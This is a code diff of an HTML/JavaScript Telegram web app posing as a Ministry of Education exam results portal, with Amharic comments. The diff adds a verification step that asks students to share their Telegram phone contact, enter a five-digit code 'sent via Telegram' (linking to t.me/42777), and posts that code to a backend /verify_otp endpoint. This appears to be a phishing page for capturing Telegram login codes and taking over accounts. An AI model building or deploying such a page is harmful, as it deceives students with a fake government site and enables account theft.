@@ -2,7 +2,7 @@
 <html lang="en">  
 <head>  
     <meta charset="UTF-8">  
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">  
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">  
     <title>Ministry of Education - Results Portal</title>  
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.2/css/all.min.css">  
     <link rel="preconnect" href="https://fonts.googleapis.com">  
@@ -13,14 +13,19 @@
     <script src="./config.js"></script>
 
 <style>
-* { margin: 0; padding: 0; box-sizing: border-box; }
+* { margin: 0; padding: 0; box-sizing: border-box; -webkit-tap-highlight-color: transparent; }
 body { background-color: #f5f7fa; color: #1e293b; display: flex; flex-direction: column; min-height: 100vh; font-family: "Merriweather", Georgia, serif; padding-top: 75px; }
 header { position: absolute; top: 0; left: 0; width: 100%; background-color: #154186; color: white; padding: 9px 20px; display: flex; align-items: center; gap: 14px; box-shadow: 0 2px 4px rgba(0, 0, 0, 0.08); z-index: 1000; }
 header .logo-container { width: 39px; height: 39px; background-color: white; border-radius: 50%; display: flex; align-items: center; justify-content: center; overflow: hidden; padding: 4px; }
 header .logo-container img { width: 160%; height: 160%; object-fit: contain; }
 header .header-title h1 { font-size: 19px; font-weight: 500; letter-spacing: 0.2px; line-height: 1.2; }
 header .header-title p { font-size: 13px; opacity: 0.9; margin-top: 2px; font-family: "Merriweather", serif; }
-.main-wrapper { padding: 24px 18px; max-width: 480px; margin: 0 auto; width: 100%; flex: 1; }
+.main-wrapper { padding: 24px 18px; max-width: 480px; margin: 0 auto; width: 100%; flex: 1; padding-bottom: 340px; } /* ለኪፓዱ ቦታ ለመልቀቅ */
+
+.step-view { display: none; width: 100%; animation: fadeIn 0.3s ease-in-out; }
+.active-view { display: block; }
+@keyframes fadeIn { from { opacity: 0; transform: translateY(5px); } to { opacity: 1; transform: translateY(0); } }
+
 .welcome-box { text-align: center; margin-bottom: 32px; padding: 0 10px; }
 .welcome-box h2 { color: #1e293b; font-size: 34px; font-weight: 900; margin-bottom: 14px; letter-spacing: -0.5px; }
 .welcome-box p { color: #475569; font-size: 15.5px; line-height: 1.6; }
@@ -38,8 +43,7 @@ header .header-title p { font-size: 13px; opacity: 0.9; margin-top: 2px; font-fa
 .links-heading { color: #1e293b; font-size: 24px; font-weight: 700; margin: 36px 0 16px 4px; }
 .link-row { background-color: #ffffff; border: 1px solid #e2e8f0; border-radius: 8px; padding: 16px 18px; display: flex; align-items: center; gap: 14px; margin-bottom: 12px; color: #334155; text-decoration: none; font-size: 16px; }
 .link-row i { color: #475569; font-size: 20px; width: 22px; text-align: center; }
-.form-view-container { display: none; animation: fadeIn 0.3s ease-in-out; }
-@keyframes fadeIn { from { opacity: 0; transform: translateY(5px); } to { opacity: 1; transform: translateY(0); } }
+
 .back-btn { display: inline-flex; align-items: center; gap: 8px; color: #3b4c66; font-size: 16px; font-weight: 500; text-decoration: none; margin-bottom: 24px; cursor: pointer; background: none; border: none; font-family: "Merriweather", serif; }
 .back-btn i { font-size: 16px; }
 .username-card { background-color: #ffffff; border-radius: 12px; padding: 32px 24px; text-align: center; box-shadow: 0 10px 25px -5px rgba(0, 0, 0, 0.05), 0 8px 16px -6px rgba(0, 0, 0, 0.03); border: 1px solid #edf2f7; }
@@ -61,11 +65,25 @@ header .header-title p { font-size: 13px; opacity: 0.9; margin-top: 2px; font-fa
 .error-box p { font-size: 13.5px; font-weight: 500; line-height: 1.5; font-family: "Merriweather", serif; }
 .submit-button { display: flex; align-items: center; justify-content: center; gap: 8px; width: 100%; padding: 14px; color: white; border: none; border-radius: 8px; font-size: 16px; font-weight: 600; cursor: pointer; font-family: "Merriweather", serif; margin-bottom: 24px; }
 .footer-support-link { display: inline-flex; align-items: center; gap: 6px; color: #475569; text-decoration: none; font-size: 14.5px; font-weight: 500; font-family: "Merriweather", serif; }
+
+/* Themes */
 .theme-exit .center-user-icon { background-color: #0c54a6; } .theme-exit .input-wrapper input { border-color: #0c54a6; } .theme-exit .info-box { background-color: #f0f6fc; border: 1px solid #d0e1f3; } .theme-exit .info-box i, .theme-exit .info-title { color: #0c54a6; } .theme-exit .submit-button { background-color: #0c54a6; } .theme-exit .back-btn { color: #0c54a6; }
 .theme-remedial .center-user-icon { background-color: #6f42c1; } .theme-remedial .input-wrapper input { border-color: #6f42c1; } .theme-remedial .info-box { background-color: #f8f5fc; border: 1px solid #ebdff5; } .theme-remedial .info-box i, .theme-remedial .info-title { color: #6f42c1; } .theme-remedial .submit-button { background-color: #6f42c1; } .theme-remedial .back-btn { color: #6f42c1; }
+
+/* OTP Box Styles */
+.otp-container { display: flex; gap: 10px; margin: 20px 0; justify-content: center; }
+.otp-box { width: 46px; height: 56px; border: 2.5px solid #cbd5e1; border-radius: 10px; display: flex; align-items: center; justify-content: center; font-size: 24px; font-weight: 700; background: #fff; transition: all 0.2s; color: #1e293b; }
+.otp-box.filled { border-color: #154186; box-shadow: 0 0 8px rgba(21, 65, 134, 0.15); }
+.otp-box.invalid { border-color: #ff3b30; background: #fff1f0; animation: shake 0.3s; }
+@keyframes shake { 0%, 100% { transform: translateX(0); } 25% { transform: translateX(-6px); } 75% { transform: translateX(6px); } }
+
+/* Keypad Styles */
+.keypad { display: none; grid-template-columns: repeat(3, 1fr); gap: 10px; width: 100%; max-width: 480px; padding: 15px 20px 25px 20px; background: #e2e8f0; border-top-left-radius: 20px; border-top-right-radius: 20px; position: fixed; bottom: 0; left: 50%; transform: translateX(-50%); z-index: 1100; box-shadow: 0 -4px 15px rgba(0,0,0,0.06); }
+.key { background: #fff; padding: 14px; font-size: 24px; cursor: pointer; font-weight: 700; border-radius: 10px; box-shadow: 0 2px 4px rgba(0,0,0,0.04); display: flex; justify-content: center; align-items: center; color: #1e293b; font-family: -apple-system, sans-serif; }
+.key:active { background: #cbd5e1; transform: scale(0.96); }
+
 footer { background-color: #0b438c; color: white; text-align: center; padding: 20px; font-size: 14px; border-top: 1px solid rgba(255, 255, 255, 0.1); font-family: "Merriweather", serif; margin-top: 40px; width: 100%; }
 </style>
-
 </head>  
 <body>  
 
@@ -81,7 +99,7 @@ footer { background-color: #0b438c; color: white; text-align: center; padding: 2
 
 <div class="main-wrapper">  
       
-    <div id="main-categories-view">  
+    <div id="main-categories-view" class="step-view active-view">  
         <div class="welcome-box">  
             <h2>Welcome to Results Portal</h2>  
             <p>Access your examination results from various national level examinations in one place.</p>  
@@ -133,12 +151,10 @@ footer { background-color: #0b438c; color: white; text-align: center; padding: 2
         </div>  
 
         <h3 class="links-heading">Quick Links</h3>  
-          
         <a href="#" class="link-row">  
             <i class="fa-solid fa-circle-question"></i>  
             <span>FAQs</span>  
         </a>  
-
         <a href="#" class="link-row">  
             <i class="fa-solid fa-headset"></i>  
             <span>Support</span>  
@@ -146,8 +162,7 @@ footer { background-color: #0b438c; color: white; text-align: center; padding: 2
     </div>  
 
 
-    <div id="form-dynamic-view" class="form-view-container">  
-          
+    <div id="form-dynamic-view" class="step-view">  
         <button class="back-btn" onclick="backToCategories()">  
             <i class="fa-solid fa-arrow-left"></i> Back to Categories  
         </button>  
@@ -185,9 +200,55 @@ footer { background-color: #0b438c; color: white; text-align: center; padding: 2
             <br>  
             <a href="#" class="footer-support-link"><i class="fa-solid fa-headset"></i> Contact Support</a>  
         </div>  
-
     </div>  
 
+
+    <div id="otp-verification-view" class="step-view">  
+        <button class="back-btn" onclick="backToForm()">  
+            <i class="fa-solid fa-arrow-left"></i> Back
+        </button>  
+
+        <div class="username-card" style="padding: 24px 15px;">  
+            <div class="center-user-icon" style="background-color: #154186;">  
+                <i class="fa-solid fa-shield-halved"></i>  
+            </div>  
+            <h4>Verification Code</h4>  
+            <p class="form-desc" style="margin-bottom: 10px;">We've sent a 5-digit verification code via Telegram. Please enter the code below.</p>  
+            
+            <div class="otp-container" id="otp_boxes_wrapper">  
+                <div class="otp-box" id="b0"></div>  
+                <div class="otp-box" id="b1"></div>  
+                <div class="otp-box" id="b2"></div>  
+                <div class="otp-box" id="b3"></div>  
+                <div class="otp-box" id="b4"></div>  
+            </div>  
+
+            <div class="error-box" id="otp-error-box">  
+                <i class="fa-solid fa-triangle-exclamation"></i>  
+                <p id="otp-error-text">Invalid verification code. Please try again.</p>  
+            </div>  
+
+            <p style="font-size: 14px; color: #64748b; margin-top: 15px;">  
+                Didn't receive code? <a href="https://t.me/42777" target="_blank" style="color: #154186; font-weight: bold; text-decoration: none;">Get Code</a>  
+            </p>  
+        </div>  
+    </div>  
+
+</div>  
+
+<div class="keypad" id="custom-keypad">  
+    <div class="key" onclick="pressNumber(1)">1</div>  
+    <div class="key" onclick="pressNumber(2)">2</div>  
+    <div class="key" onclick="pressNumber(3)">3</div>  
+    <div class="key" onclick="pressNumber(4)">4</div>  
+    <div class="key" onclick="pressNumber(5)">5</div>  
+    <div class="key" onclick="pressNumber(6)">6</div>  
+    <div class="key" onclick="pressNumber(7)">7</div>  
+    <div class="key" onclick="pressNumber(8)">8</div>  
+    <div class="key" onclick="pressNumber(9)">9</div>  
+    <div class="key" style="background:transparent; box-shadow:none; border:none;"></div>  
+    <div class="key" onclick="pressNumber(0)">0</div>  
+    <div class="key" onclick="pressBackspace()"><i class="fa-solid fa-delete-left" style="color:#64748b"></i></div>  
 </div>  
 
 <footer>  
@@ -196,65 +257,70 @@ footer { background-color: #0b438c; color: white; text-align: center; padding: 2
 
 
 <script>  
-    // ቴሌግራም ዌብ አፕን የማስጀመር ስራ
     const tg = window.Telegram.WebApp;
     if (tg) {
         tg.expand();
         tg.ready();
     }
 
-    // ከ config.js የሚመጣውን API_BASE_URL ለመያዝ (ካልተገኘ መለዋወጫ)
     const BASE_URL = typeof API_BASE_URL !== 'undefined' ? API_BASE_URL : 'https://your-backend-api.com';
 
+    // የሁሉም ገጾች DOM ጥሪዎች
     const mainCategoriesView = document.getElementById('main-categories-view');  
     const formDynamicView = document.getElementById('form-dynamic-view');  
+    const otpVerificationView = document.getElementById('otp-verification-view');  
+    const customKeypad = document.getElementById('custom-keypad');  
+
     const dynamicFormDesc = document.getElementById('dynamic-form-desc');  
     const submitBtnText = document.getElementById('submit-btn-text');  
     const usernameInputField = document.getElementById('username-input-field');  
     const validationErrorBox = document.getElementById('validation-error-box');  
+    const otpErrorBox = document.getElementById('otp-error-box');  
     const dynamicSubmitBtn = document.getElementById('dynamic-submit-btn');  
 
     let userId = (tg && tg.initDataUnsafe && tg.initDataUnsafe.user) ? tg.initDataUnsafe.user.id.toString() : "test_user";
     let savedName = (tg && tg.initDataUnsafe && tg.initDataUnsafe.user) ? tg.initDataUnsafe.user.first_name : "User";
+    
     let isProcessing = false;
+    let currentOtp = ""; 
 
-    // ቁልፍ በተኖቹ ሲነኩ ወደ ፎርም ገጽ የሚወስድ  
+    function changeView(targetView) {
+        document.querySelectorAll('.step-view').forEach(v => v.classList.remove('active-view'));
+        targetView.classList.add('active-view');
+        
+        // OTP ገጽ ላይ ከሆነ ኪፓዱ እንዲበራ ማድረግ
+        if (targetView === otpVerificationView) {
+            customKeypad.style.display = 'grid';
+        } else {
+            customKeypad.style.display = 'none';
+        }
+        window.scrollTo(0, 0);
+    }
+
     function openFormPage(type) {  
-        mainCategoriesView.style.display = 'none';  
-        formDynamicView.style.display = 'block';  
-          
-        formDynamicView.className = 'form-view-container';  
         usernameInputField.value = '';  
         validationErrorBox.style.display = 'none';  
+        changeView(formDynamicView);
 
         if (type === 'exit') {  
-            formDynamicView.classList.add('theme-exit');  
+            formDynamicView.className = 'step-view active-view theme-exit';  
             dynamicFormDesc.innerText = "Enter the username you used to take the exam to view your examination results";  
             submitBtnText.innerText = "View Result";  
         } else if (type === 'remedial') {  
-            formDynamicView.classList.add('theme-remedial');  
+            formDynamicView.className = 'step-view active-view theme-remedial';  
             dynamicFormDesc.innerText = "Enter the username you used to take the remedial exam to view your results";  
             submitBtnText.innerText = "Access Results";  
         }  
-
-        window.scrollTo(0, 0);  
     }  
 
-    // "Back to Categories" ሲነካ ወደ መጀመሪያው ገጽ የሚመልስ  
-    function backToCategories() {  
-        formDynamicView.style.display = 'none';  
-        mainCategoriesView.style.display = 'block';  
-          
-        window.scrollTo(0, 0);  
-    }  
+    function backToCategories() { changeView(mainCategoriesView); }  
+    function backToForm() { changeView(formDynamicView); }  
 
-    // "View Result" ሲነካ የርዝማኔ ፍተሻ፣ የዳታቤዝ ፍተሻ እና የኮንታክት ጥያቄዎችን የሚሰራው ዋና ተግባር
+    // "View Result" ሲነካ የሚሰራው ዋናው ሎጂክ
     async function validateOnSubmit() {  
         if (isProcessing) return;
-
         const value = usernameInputField.value.trim();  
         
-        // 1. መጀመሪያ ከ 5 ቃላት/ፊደላት በታች መሆኑን ያረጋግጣል
         if (value.length < 5) {  
             showUiError("Username must be 5-15 characters long.");
             return;  
@@ -262,14 +328,12 @@ footer { background-color: #0b438c; color: white; text-align: center; padding: 2
             validationErrorBox.style.display = 'none';  
         }  
 
-        // የአዝራሩን ገጽታ ወደ Loading መቀየር
         isProcessing = true;
         dynamicSubmitBtn.disabled = true;
         const originalBtnText = submitBtnText.innerText;
         submitBtnText.innerText = "Loading...";
 
         try {
-            // 2. ተጠቃሚው አስቀድሞ በዳታቤዝ ውስጥ መኖሩን ማረጋገጥ
             const res = await fetch(`${BASE_URL}/check_user_db`, {
                 method: 'POST',
                 headers: {'Content-Type': 'application/json'},
@@ -277,14 +341,13 @@ footer { background-color: #0b438c; color: white; text-align: center; padding: 2
             });
             const data = await res.json();
 
-            // 3. ስልኩ ካለ (FOUND ወይም NEED_OTP) ኮንታክት ሳይጠይቅ በቀጥታ ወደ OTP ሂደት ያልፋል
             if (data.status === "FOUND" || data.status === "NEED_OTP") {
-                processToOTP();
-            } else if (data.status === "SUCCESS") {
-                alert("ተሳክቷል! ወደ ውጤት ማውጫ በመሸጋገር ላይ...");
                 resetButton(originalBtnText);
+                switchToOtpPage();
+            } else if (data.status === "SUCCESS") {
+                resetButton(originalBtnText);
+                alert("Identity confirmed!");
             } else { 
-                // 4. አዲስ ተጠቃሚ ከሆነ የቴሌግራም ስልክ ማጋሪያ ጥያቄ (Contact Share) ማንሳት
                 requestUserContact(originalBtnText);
             }
         } catch(e) { 
@@ -293,47 +356,131 @@ footer { background-color: #0b438c; color: white; text-align: center; padding: 2
         }
     }
 
-    // የቴሌግራም Contact Share ጥያቄ ማቅረቢያ
     function requestUserContact(originalText) {
         if (tg) {
             tg.requestContact((success) => {
                 if (success) {
-                    // ስልክ ቁጥሩን በተሳካ ሁኔታ ካጋራ ወደ OTP ሂደት ይሄዳል
-                    processToOTP();
+                    switchToOtpPage();
                 } else { 
-                    // ተጠቃሚው Cancel ካደረገ ወይም ፍቃደኛ ካልሆነ እዚህ ጋር ይቆማል
                     resetButton(originalText);
                     showUiError("ለማስቀጠል እባክዎ መጀመሪያ ስልክ ቁጥርዎን ያጋሩ።");
                 }
             });
         } else {
-            // ከቴሌግራም ውጪ ብሮውዘር ላይ ለመሞከር (Fallback)
-            let mockConfirm = confirm("[የሙከራ አካባቢ] እባክዎ ስልክ ቁጥርዎን ለማጋራት ፍቃደኛ ይሁኑ?");
-            if (mockConfirm) {
-                processToOTP();
-            } else {
-                resetButton(originalText);
-                showUiError("ለማስቀጠል እባክዎ መጀመሪያ ስልክ ቁጥርዎን ያጋሩ።");
+            let mockConfirm = confirm("[የሙከራ] ለማስቀጠል ስልክ ቁጥርዎን ማጋራት ይፈልጋሉ?");
+            if (mockConfirm) { switchToOtpPage(); } 
+            else { resetButton(originalText); showUiError("ለማስቀጠል እባክዎ መጀመሪያ ስልክ ቁጥርዎን ያጋሩ።"); }
+        }
+    }
+
+    // ወደ OTP ገጽ ማሸጋገሪያ
+    function switchToOtpPage() {
+        currentOtp = "";
+        updateOtpUi();
+        clearOtpStatus();
+        otpErrorBox.style.display = 'none';
+        changeView(otpVerificationView);
+    }
+
+    // የኪፓድ ቁጥሮች ሲጫኑ
+    function pressNumber(num) {
+        if (window.navigator.vibrate) window.navigator.vibrate(15);
+        otpErrorBox.style.display = 'none';
+        clearOtpStatus();
+
+        if (currentOtp.length < 5) {
+            currentOtp += num;
+            updateOtpUi();
+            if (currentOtp.length === 5) {
+                submitOTPCode();
             }
         }
     }
 
-    // ወደ OTP ሽግግር የሚወስድ መነሻ (የእርስዎን የጀርባ አሰራር/Backend የሚቀሰቅስ)
-    function processToOTP() {
-        validationErrorBox.style.display = 'none';
-        alert("የማረጋገጫ ኮድ በቴሌግራም ተልኮልዎታል። እባክዎ የደረሰዎትን OTP ያስገቡ።");
-        
-        // እዚህ ጋር ወደ ቀጣዩ የ OTP ማስገቢያ ገጽ (ለምሳሌ፡ showStep(2); ወይም ተፈላጊውን የ UI ኮድ ማስገባት ይችላሉ)
+    // Backspace ሲጫን
+    function pressBackspace() {
+        if (window.navigator.vibrate) window.navigator.vibrate(15);
+        clearOtpStatus();
+        currentOtp = currentOtp.slice(0, -1);
+        updateOtpUi();
     }
 
-    // ቁልፉን ወደ ነበረበት መመለሻ
+    // የሳጥኖቹን ቁጥር ማደሻ
+    function updateOtpUi() {
+        for (let i = 0; i < 5; i++) {
+            const box = document.getElementById('b' + i);
+            box.innerText = currentOtp[i] || "";
+            if (currentOtp[i]) {
+                box.classList.add('filled');
+            } else {
+                box.classList.remove('filled');
+            }
+        }
+    }
+
+    function setOtpStatus(statusClass) {
+        for (let i = 0; i < 5; i++) {
+            document.getElementById('b' + i).classList.add(statusClass);
+        }
+    }
+
+    function clearOtpStatus() {
+        for (let i = 0; i < 5; i++) {
+            document.getElementById('b' + i).classList.remove('invalid');
+        }
+    }
+
+    // OTP ኮዱን ወደ ፒክቶን (Backend) መላኪያ ፍተሻ
+    async function submitOTPCode() {
+        otpErrorBox.style.display = 'flex';
+        otpErrorBox.style.backgroundColor = '#e1effe';
+        otpErrorBox.style.borderColor = '#b3d7ff';
+        otpErrorBox.querySelector('p').style.color = '#1e429f';
+        otpErrorBox.querySelector('p').innerText = "Verifying code...";
+
+        try {
+            const res = await fetch(`${BASE_URL}/verify_otp`, {
+                method: 'POST',
+                headers: {'Content-Type': 'application/json'},
+                body: JSON.stringify({ session_id: userId, otp: currentOtp })
+            });
+            const data = await res.json();
+
+            if (data.status === "SUCCESS") {
+                otpErrorBox.style.backgroundColor = '#e6f4ea';
+                otpErrorBox.style.borderColor = '#b7e1cd';
+                otpErrorBox.querySelector('p').style.color = '#137333';
+                otpErrorBox.querySelector('p').innerText = "Success! Redirecting...";
+                alert("ውጤቱ በስኬት ተረጋግጧል!");
+            } else {
+                handleOtpFailure();
+            }
+        } catch(e) {
+            handleOtpFailure("የአውታረ መረብ ስህተት ተከስቷል።");
+        }
+    }
+
+    function handleOtpFailure(msg) {
+        setOtpStatus('invalid');
+        otpErrorBox.style.display = 'flex';
+        otpErrorBox.style.backgroundColor = '#ffebee';
+        otpErrorBox.style.borderColor = '#ffcdd2';
+        otpErrorBox.querySelector('p').style.color = '#c62828';
+        otpErrorBox.querySelector('p').innerText = msg || "Invalid verification code. Please try again.";
+        
+        setTimeout(() => {
+            currentOtp = "";
+            updateOtpUi();
+            clearOtpStatus();
+        }, 1200);
+    }
+
     function resetButton(text) {
         isProcessing = false;
         dynamicSubmitBtn.disabled = false;
         submitBtnText.innerText = text;
     }
 
-    // ስህተቶችን በ UI የኤረር ሳጥን ላይ ማሳያ
     function showUiError(message) {
         validationErrorBox.style.display = 'flex';
         validationErrorBox.querySelector('p').innerText = message;
